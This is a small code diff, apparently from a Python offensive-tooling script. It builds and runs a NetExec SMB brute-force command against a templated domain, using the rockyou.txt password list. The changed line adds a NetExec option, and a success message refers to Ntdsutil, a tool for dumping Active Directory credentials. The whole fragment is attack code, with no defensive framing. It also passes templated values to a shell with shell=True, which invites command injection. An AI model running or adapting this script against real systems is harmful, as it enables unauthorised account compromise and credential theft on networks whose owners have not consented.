@@ -9,7 +9,7 @@
       wordlist= "/usr/share/wordlists/rockyou.txt"
       domain="{{ domain }}"
 
-      command= f"nxc smb {domain} -u {username} -p {wordlist}"
+      command= f"nxc smb {domain} -u {username} -p {wordlist} --ignore-pw-decoding"
       result = subprocess.run(command, shell=True, capture_output=True, text=True)
       if result.returncode == 0:
          print("Execution of Ntdsutil")
